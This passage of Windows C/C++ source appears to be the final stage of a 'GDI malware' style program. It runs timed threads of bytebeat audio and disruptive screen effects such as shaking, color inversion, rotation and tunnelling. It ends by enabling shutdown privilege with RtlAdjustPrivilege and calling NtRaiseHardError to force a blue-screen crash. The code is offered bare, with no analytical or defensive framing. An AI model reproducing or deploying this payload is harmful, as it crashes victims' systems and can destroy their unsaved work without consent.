			HANDLE ByteBeatHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ByteBeat, 0, 0, 0);
			HANDLE ShakeHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Shake, 0, 0, 0);
			HANDLE ColorsHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Colors, 0, 0, 0);
			HANDLE IconsHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Icons, 0, 0, 0);
			Sleep(30000);
			TerminateThread(ShakeHandle, 1);
			TerminateThread(ColorsHandle, 1);
			TerminateThread(IconsHandle, 1);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE ByteBeat2Handle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ByteBeat2, 0, 0, 0);
			HANDLE JustATextHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)JustAText, 0, 0, 0);
			HANDLE Colors2FastHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Colors2Fast, 0, 0, 0);
			Sleep(30000);
			TerminateThread(JustATextHandle, 1);
			TerminateThread(Colors2FastHandle, 1);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE ByteBeat3Handle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ByteBeat3, 0, 0, 0);
			HANDLE CrazyEffectHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)CrazyEffect, 0, 0, 0);
			Sleep(30000);
			TerminateThread(CrazyEffectHandle, 1);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE ByteBeat4Handle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ByteBeat4, 0, 0, 0);
			HANDLE Colors3Handle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Colors3, 0, 0, 0);
			HANDLE PlgAHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)PlgA, 0, 0, 0);
			Sleep(30000);
			TerminateThread(Colors3Handle, 1);
			TerminateThread(PlgAHandle, 1);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE ByteBeat5Handle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ByteBeat5, 0, 0, 0);
			HANDLE RotateHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Rotate, 0, 0, 0);
			Sleep(30000);
			TerminateThread(RotateHandle, 1);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE ByteBeat6Handle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ByteBeat6, 0, 0, 0);
			HANDLE BitBltInsaneHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)BitBltInsane, 0, 0, 0);
			Sleep(30000);
			TerminateThread(BitBltInsaneHandle, 1);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE ByteBeat7Handle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ByteBeat7, 0, 0, 0);
			HANDLE ColorHalfHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ColorHalf, 0, 0, 0);
			HANDLE TextOut2Handle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)TextOut2, 0, 0, 0);
			Sleep(30000);
			TerminateThread(ColorHalfHandle, 1);
			TerminateThread(TextOut2Handle, 1);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE ByteBeat8Handle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ByteBeat8, 0, 0, 0);
			HANDLE SomethingHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Something, 0, 0, 0);
			Sleep(30000);
			TerminateThread(SomethingHandle, 1);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE ByteBeat9Handle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ByteBeat9, 0, 0, 0);
			HANDLE TunHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Tun, 0, 0, 0);
			Sleep(30000);
			TerminateThread(TunHandle, 1);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE ByteBeat10Handle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ByteBeat10, 0, 0, 0);
			HANDLE DeltHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Delt, 0, 0, 0);
			Sleep(15000);
			TerminateThread(DeltHandle, 1);
			InvalidateRect(0, 0, 0);
			HANDLE Delty2Handle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Delty2, 0, 0, 0);
			Sleep(15000);
			TerminateThread(Delty2Handle, 1);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE ByteBeat11Handle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ByteBeat11, 0, 0, 0);
			HANDLE Colors2Fast2Handle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Colors2Fast, 0, 0, 0);
			HANDLE CometRingHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)CometRing, 0, 0, 0);
			Sleep(30000);
			TerminateThread(Colors2Fast2Handle, 1);
			TerminateThread(CometRingHandle, 1);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE ByteBeat12Handle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ByteBeat12, 0, 0, 0);
			HANDLE Colors32Handle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Colors3, 0, 0, 0);
			HANDLE TextOut3Handle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)TextOut3, 0, 0, 0);
			Sleep(30000);
			BOOLEAN b;
			unsigned long response;
			RtlAdjustPrivilege(19, true, false, &b);
			NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
			Sleep(INFINITE);
		}
	}
}